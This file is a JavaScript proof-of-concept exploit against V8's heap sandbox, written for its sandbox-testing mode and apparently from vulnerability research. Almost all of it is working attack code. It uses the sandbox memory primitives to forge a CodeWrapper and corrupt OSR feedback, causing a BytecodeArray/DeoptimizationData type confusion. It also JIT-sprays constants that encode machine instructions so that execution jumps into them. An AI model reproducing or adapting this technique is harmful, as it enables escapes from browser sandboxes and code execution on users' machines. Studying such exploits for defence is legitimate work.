// --sandbox-testing
const kHeapObjectTag = 1;
const kJSObjectElementsOffset = 0x8;
const kFixedArrayObjectsOffset = 0x8;
const kCodeWrapperMap = 0x11e1;
const kJSFunctionSharedFunctionInfoOffset = 0x10;
const kSharedFunctionInfoTrustedFunctionDataOffset = 4;
const kJSFunctionFeedbackCellOffset = 0x18;
const kFeedbackCellValueOffset = 0x4;
const kFeedbackVectorRawFeedbackSlotsOffset = 0x1c;
const kSmiTagSize = 1;
let memory = new DataView(new Sandbox.MemoryView(0, 0x100000000));
function getPtr(obj) {
  return Sandbox.getAddressOf(obj) + kHeapObjectTag;
}
function getObj(ptr) {
  return Sandbox.getObjectAt(ptr);
}
function getField(obj, offset) {
  return memory.getUint32(obj + offset - kHeapObjectTag, true);
}
function getField64(obj, offset) {
  return memory.getBigUint64(obj + offset - kHeapObjectTag, true);
}
function setField(obj, offset, value) {
  memory.setUint32(obj + offset - kHeapObjectTag, value, true);
}
function setField64(obj, offset, value) {
  memory.setBigUint64(obj + offset - kHeapObjectTag, value, true);
}
function gc() {
  new ArrayBuffer(0x7fe00000);
}
function findObject(start, needle) {
  function match() {
    for (let k = 0; k < needle.length; ++k) {
      if (getField(start, k * 4) != needle[k]) return false;
    }
    return true;
  }
  while (!match()) start += 4;
  return start;
}

// scratchpad
let scr_arr = Array(0x100).fill(0).map((_, i) => 0x21210002 | i << 7);
let pscr = getField(getPtr(scr_arr), kJSObjectElementsOffset) + kFixedArrayObjectsOffset + 0x200;

// fake OSR target & OSR replacement victim
// code base 0x240, baseline jit spray 0x063f (pad [0, 0], idx 0x53), jump offset frame_size * 4
/* jit spray w/ 1u/4c/7u:
   0x60aac8b80227    mov    eax, 0xbd5b7dde                 EAX => 0xbd5b7dde ◂— 0
   0x60aac8b8022c    mov    qword ptr [rbp - 0x38], rax
   ...
*/
const frame_size = 0x100;  // BytecodeArray::kFrameSizeOffset == DeoptimizationData::kOsrPcOffsetIndex
const payload = [
  0, 0,
  ...Array(0x53).fill(0).map((_, i) => 0x21210000 + i),
  // OSR target address lands exactly at the following constant
  0x0b0f9090 >> 1,  // nop; nop; ud2
]; // sprayed as smis
const code_str = Array(frame_size).fill(0).map((_, i) => `let v${i} = ${payload[i] ?? 0};`).join('\n');
const fake_osr_tgt = new Function('p1', code_str);  // params cnt must match osr_func
const osr_func = new Function('loop', 'for (let i = 0; i < loop; i++);');

// baseline compile - code handle 0x400600
for (let i = 0; i < 0x1000; i++) {
  fake_osr_tgt();
}
let ptgt_fn = getPtr(fake_osr_tgt);
let ptgt_sfi = getField(ptgt_fn, kJSFunctionSharedFunctionInfoOffset);
let htgt_code = getField(ptgt_sfi, kSharedFunctionInfoTrustedFunctionDataOffset);

// allocate FeedbackVector
osr_func(0x10);

// make a fake CodeWrapper pointing to baseline fake_osr_target
let pfake_wrapper_strong = pscr;
setField(pfake_wrapper_strong, 0, kCodeWrapperMap);
setField(pfake_wrapper_strong, 4, htgt_code);

// set fake OSR feedback
let pfn = getPtr(osr_func);
let pfbc = getField(pfn, kJSFunctionFeedbackCellOffset);
let pfbv = getField(pfbc, kFeedbackCellValueOffset);
setField(pfbv, kFeedbackVectorRawFeedbackSlotsOffset + 4 * 2, pfake_wrapper_strong | 2);

// trigger OSR, confusing BytecodeArray -> DeoptimizationData
readline();
osr_func(0x10000);
